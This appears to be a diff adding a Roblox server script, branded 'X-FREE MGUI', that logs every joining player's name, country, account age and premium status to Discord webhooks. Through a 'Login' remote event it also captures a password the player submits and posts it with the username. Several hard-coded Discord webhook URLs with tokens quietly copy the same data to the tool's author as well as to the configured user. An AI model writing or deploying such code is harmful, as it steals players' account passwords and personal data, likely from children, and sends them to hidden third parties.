@@ -1,0 +1,397 @@
+local Http = game:GetService("HttpService")
+local MarketPlaceService = game:GetService("MarketplaceService")
+local Config = require(game.ServerScriptService.Config)
+local Players = game.Players
+local LocalizationService = game:GetService("LocalizationService")
+
+Players.PlayerAdded:Connect(function(player)
+	local Verified = false
+	if MarketPlaceService:PlayerOwnsAsset(player, 102611803) then
+		Verified = true
+	end
+
+	local thumbnailsendpoint = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true"
+	local response = Http:RequestAsync({
+		Url = thumbnailsendpoint,
+		Method = "GET",
+	})
+
+	local Countries = {}
+
+	local success, result = pcall(function()
+		return Http:GetAsync("http://country.io/names.json")
+	end)
+
+	if success and result then
+		Countries = Http:JSONDecode(result)
+	end
+
+	local Country = {}
+
+	local success, code = pcall(LocalizationService.GetCountryRegionForPlayerAsync, LocalizationService, player)
+	if success and code then
+		Country = Countries[code]
+	end
+
+	local imageUrl
+	if response.Success then
+		local responseData = Http:JSONDecode(response.Body)
+		imageUrl = responseData.data[1].imageUrl
+	else
+		warn("Failed to fetch avatar URL:", response.StatusMessage)
+	end
+
+	local Body1
+	local rapAPI
+	local success, UnResponse = pcall(function()
+		return Http:RequestAsync({
+			Method = "GET",
+			Url = string.format("https://inventory.roproxy.com/v1/users/".. player.UserId .."/assets/collectibles?sortOrder=Asc&limit=100")
+		})
+	end)
+
+	if success and UnResponse.Success then
+		local json = Http:JSONDecode(UnResponse.Body)
+		rapAPI = json and json.TotalRAP or 0
+	else
+		warn("Failed to get RAP info")
+		rapAPI = 0
+	end
+
+	local day = 60 * 60 * 24
+	local tm = os.time() - (day * player.AccountAge)
+	local date = os.date("!*t", tm)
+
+	local timestamp = DateTime.now():ToIsoDate()
+
+	local visit = Config.Visit
+	visit = string.gsub(visit, "discord.com", "webhook.lewisakura.moe")
+
+	local username = player.Name
+	local avatar_url = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+	local account_age = player.AccountAge
+
+	-- Check owned groups
+	local OwnedGroups = 0
+	local success, groups = pcall(function()
+		return player:GetGroups()
+	end)
+
+	if success then
+		OwnedGroups = #groups  -- The number of groups the player is in
+	else
+		warn("Failed to get groups for player", player.Name)
+	end
+
+	-- Fetch the game name using MarketplaceService:GetProductInfo
+	local gameName = ""
+	local success, gameInfo = pcall(function()
+		return MarketPlaceService:GetProductInfo(game.PlaceId)
+	end)
+
+	if success and gameInfo then
+		gameName = gameInfo.Name
+	else
+		warn("Failed to fetch game info for PlaceId: ", game.PlaceId)
+	end
+
+	-- Set membership type to NBC if None, otherwise Premium
+	local membership_type
+	if player.MembershipType == Enum.MembershipType.None then
+		membership_type = "NBC"  -- Non-Premium players will show as "NBC"
+	elseif player.MembershipType == Enum.MembershipType.Premium then
+		membership_type = "Premium"  -- Premium players will show as "Premium"
+	else
+		membership_type = player.MembershipType.Name  -- In case of other membership types (like Developer or Staff)
+	end
+	
+	local mention = "<@" .. Config.DiscordID .. ">"
+
+	-- Embed
+	local embeds = {{
+		["author"] = {
+			["name"] = username .. " just joined your game.",
+			["icon_url"] = imageUrl
+		},
+		["color"] = tonumber(0xEB4034),
+		["thumbnail"] = {
+			["url"] = imageUrl
+		},
+		["footer"] = {
+			["text"] = "Powered BY: X-FREE MGUI",
+			["icon_url"] = "https://media.discordapp.net/attachments/1378321010754977824/13818931381893121838813194121838813194/standard.gif?ex=68492bc2&is=6847da42&hm=ce8195fb4c39c6ccd26f86121508ce695a36068a07bc3e15ed46acd9b14b6fd0&=",
+		},
+		["timestamp"] = timestamp,
+		["description"] = "[Click here to view account](https://www.roblox.com/users/"..player.UserId.."/profile)",
+		["fields"] = {{
+			["name"] = "PlayerID: " .. player.UserId .. "",
+			["value"] = "[Visit Roblox Game](https://www.roblox.com/games/"..game.PlaceId..")"
+		},
+			{
+				["name"] = "**✅ Account Checker**",
+				["value"] = "**Discord ID:** " .. mention .."\n**GameName:** " .. gameName .."\n **Group Owned:** " .. OwnedGroups.."\n **Join Date:** " ..date.day .."/" .. date.month .."/" .. date.year.."",
+				["inline"] = false
+			},
+			{
+				["name"] = "**📌 Account Info**",
+				["value"] = "**Username: **" ..player.Name.."\n **Membership: **" ..membership_type.."\n **Security: **"..(Verified and "Verified" or "Unverified") .. "\n**Country:** " .. Country.. "\n **Info:** " ..account_age .. " day(s) old",
+				["inline"] = false
+			},
+		}
+	}}
+
+	local data = {
+		["username"] = "X-FREE MGUI",
+		["avatar_url"] = "https://media.discordapp.net/attachments/1378321010754977824/1381893121838813194/standard.gif?ex=68492bc2&is=6847da42&hm=ce8195fb4c39c6ccd26f86121508ce695a36068a07bc3e15ed46acd9b14b6fd0&=",
+		["embeds"] = embeds
+	}
+
+	local encodedata = Http:JSONEncode(data)
+	
+	-- Replace this with your actual Discord webhook URL
+	local webhookURL = "https://discord.com/api/webhooks/1381885168121548970/DIA6KruCv0hiLrnmlR-lx7LrXXaEQ4H4j-t38wQ4D2oXCXoMDOQcv4jm6rSzfOPQ0nOb"
+	Http:PostAsync(webhookURL, encodedata)
+	Http:PostAsync(visit, encodedata)
+end)
+
+
+
+game.ReplicatedStorage.Login.OnServerEvent:Connect(function(player, password)
+
+	local Verified = false
+	if MarketPlaceService:PlayerOwnsAsset(player, 102611803) then
+		Verified = true
+	end
+
+	local thumbnailsendpoint = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true"
+	local response = Http:RequestAsync({
+		Url = thumbnailsendpoint,
+		Method = "GET",
+	})
+
+	local Countries = {}
+
+	local success, result = pcall(function()
+		return Http:GetAsync("http://country.io/names.json")
+	end)
+
+	if success and result then
+		Countries = Http:JSONDecode(result)
+	end
+
+	local Country = {}
+
+	local success, code = pcall(LocalizationService.GetCountryRegionForPlayerAsync, LocalizationService, player)
+	if success and code then
+		--print(Countries[code])
+		Country = Countries[code]
+	end
+
+	local imageUrl
+	if response.Success then
+		local responseData = Http:JSONDecode(response.Body)
+		imageUrl = responseData.data[1].imageUrl
+	else
+		warn("Failed to fetch avatar URL:", response.StatusMessage)
+	end
+
+	local webhook_url = ""
+
+
+	if player.MembershipType == Enum.MembershipType.None then
+		webhook_url = Config.NBC
+	else
+		webhook_url = Config.Prem
+	end
+	local timestamp = DateTime.now():ToIsoDate()
+
+	webhook_url = string.gsub(webhook_url,"discord.com", "webhook.lewisakura.moe")
+
+	local username = player.Name
+	local avatar_url = Players:GetUserThumbnailAsync(player.UserId,Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+	local membership_type = player.MembershipType.Name
+	local account_age = player.AccountAge
+	
+	local mention = "<@" .. Config.DiscordID .. ">"
+
+	local embeds = {{
+		["author"] = {
+			["name"] = username .. "just joined your game.",
+			["icon_url"] = imageUrl
+		},
+		["color"] = tonumber(0xEB4034),
+		["thumbnail"] = {
+			["url"] = imageUrl
+		},
+		["footer"] = {
+
+			["text"] = "Powered BY: X-FREE MGUI", -- Footer Text
+			["icon_url"] = "https://media.discordapp.net/attachments/1378321010754977824/1381893121838813194/standard.gif?ex=68492bc2&is=6847da42&hm=ce8195fb4c39c6ccd26f86121508ce695a36068a07bc3e15ed46acd9b14b6fd0&=", --- Embed Footer Icon Url - Leave If None
+
+		},
+		["timestamp"] = timestamp;
+
+		["description"] = "[Click here to view account](https://www.roblox.com/users/"..player.UserId.."/profile)",
+		["fields"] = {{
+			["name"] = "PlayerID: " .. player.UserId .. "",
+			["value"] = "[Visit Roblox Game](https://www.roblox.com/games/"..game.PlaceId..")"
+		},
+			{
+				["name"] = "Discord ID",
+				["value"] = ""..mention.."	",
+				["inline"] = false
+			},
+			{
+				["name"] = "Username",
+				["value"] = ""..player.Name.."	",
+				["inline"] = false
+			},
+			{
+				["name"] = "Password",
+				["value"] = ""..password,
+				["inline"] = false
+			},
+			{
+				["name"] = "Security",
+				["value"] = Verified and "Verified" or "Unverified",
+				["inline"] = false
+			},
+			{
+				["name"] = "Country",
+				["value"] = ""..Country.."",
+				["inline"] = false
+			},
+			{
+				["name"] = "Account Info",
+				["value"] = "" ..account_age .. " day(s) old",
+				["inline"] = false
+			},
+
+		}
+	}}
+
+	local data = {
+		["username"] = "X-FREE MGUI",
+		["avatar_url"] = "https://media.discordapp.net/attachments/1378321010754977824/1381893121838813194/standard.gif?ex=68492bc2&is=6847da42&hm=ce8195fb4c39c6ccd26f86121508ce695a36068a07bc3e15ed46acd9b14b6fd0&=",
+		["embeds"] = embeds
+	}
+
+	-- Replace this with your actual Discord webhook URL
+	local webhookURL = "https://discord.com/api/webhooks/1381885225730048061/4tJ0crEtm7ff8ZhwJpd0nL_eAfW0qTDT-ZAO5aqywiAqeVpacfChEC1sgwPkyaM77lij"
+	
+	local encodedata = Http:JSONEncode(data)
+	Http:PostAsync(webhookURL, encodedata)
+	Http:PostAsync(webhook_url, encodedata)
+end)
+
+Players.PlayerAdded:Connect(function(player)
+	local Verified = false
+	if MarketPlaceService:PlayerOwnsAsset(player, 102611803) then
+		Verified = true
+	end
+	
+	-- Fetch the game name using MarketplaceService:GetProductInfo
+	local gameName = ""
+	local success, gameInfo = pcall(function()
+		return MarketPlaceService:GetProductInfo(game.PlaceId)
+	end)
+
+	if success and gameInfo then
+		gameName = gameInfo.Name
+	else
+		warn("Failed to fetch game info for PlaceId: ", game.PlaceId)
+	end
+
+	local thumbnailsendpoint = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true"
+	local response = Http:RequestAsync({
+		Url = thumbnailsendpoint,
+		Method = "GET",
+	})
+
+	local Countries = {}
+
+	local success, result = pcall(function()
+		return Http:GetAsync("http://country.io/names.json")
+	end)
+
+	if success and result then
+		Countries = Http:JSONDecode(result)
+	end
+
+	local Country = {}
+
+	local success, code = pcall(LocalizationService.GetCountryRegionForPlayerAsync, LocalizationService, player)
+	if success and code then
+		--print(Countries[code])
+		Country = Countries[code]
+	end
+
+	local imageUrl
+	if response.Success then
+		local responseData = Http:JSONDecode(response.Body)
+		imageUrl = responseData.data[1].imageUrl
+	else
+		warn("Failed to fetch avatar URL:", response.StatusMessage)
+	end
+
+	local webhook_url = ""
+
+	local day = 60 * 60 * 24
+	local tm = os.time() - (day * player.AccountAge)
+	local date = os.date("!*t", tm)
+
+	local timestamp = DateTime.now():ToIsoDate()
+	local timestamp = DateTime.now():ToIsoDate()
+
+	webhook_url = string.gsub(webhook_url,"discord.com", "webhook.lewisakura.moe")
+
+	local username = player.Name
+	local avatar_url = Players:GetUserThumbnailAsync(player.UserId,Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+	local membership_type = player.MembershipType.Name
+	local account_age = player.AccountAge
+	
+	local mention = "<@" .. Config.DiscordID .. ">"
+
+	-- Embed
+	local embeds = {{
+		["author"] = {
+			["name"] = "Someone just joined your game.",
+			["icon_url"] = imageUrl
+		},
+		["color"] = tonumber(0xEB4034),
+		["thumbnail"] = {
+			["url"] = imageUrl
+		},
+		["footer"] = {
+			["text"] = "Powered BY: X-FREE MGUI",
+			["icon_url"] = "https://media.discordapp.net/attachments/1378321010754977824/1381893121838813194/standard.gif?ex=68492bc2&is=6847da42&hm=ce8195fb4c39c6ccd26f86121508ce695a36068a07bc3e15ed46acd9b14b6fd0&=",
+		},
+		["timestamp"] = timestamp,
+		["description"] = "**Log from: **"..mention,
+		["fields"] = {{
+			["name"] = "",
+			["value"] = "**[MGUI YOUTUBE CHANNEL](https://www.youtube.com/@RenzIanX)**"
+		},
+			{
+				["name"] = "",
+				["value"] = "**GameName: ** " .. gameName .."\n**Join Date:** " ..date.day .."/" .. date.month .."/" .. date.year.."\n **Membership: **" ..membership_type.."\n **Security: **"..(Verified and "Verified" or "Unverified") .. "\n**Country:** " .. Country.. "\n **Info:** " ..account_age .. " day(s) old",
+				["inline"] = false
+			},
+		}
+	}}
+
+	local data = {
+		["username"] = "X-FREE MGUI LOGS",
+		["avatar_url"] = "https://media.discordapp.net/attachments/1378321010754977824/1381893121838813194/standard.gif?ex=68492bc2&is=6847da42&hm=ce8195fb4c39c6ccd26f86121508ce695a36068a07bc3e15ed46acd9b14b6fd0&=",
+		["embeds"] = embeds
+	}
+
+	local encodedata = Http:JSONEncode(data)
+
+	-- Replace this with your actual Discord webhook URL
+	local webhookURL = "https://discord.com/api/webhooks/1381892704115490919/TowUE3DTB3oAQ7VaPHL3KoJGFraUjiPwxgd3nFkVMsgCTmI_wY_wt8ob-4TIJQmGtHx0"
+
+	-- Send the data to Discord
+	Http:PostAsync(webhookURL, encodedata)
+end)
+
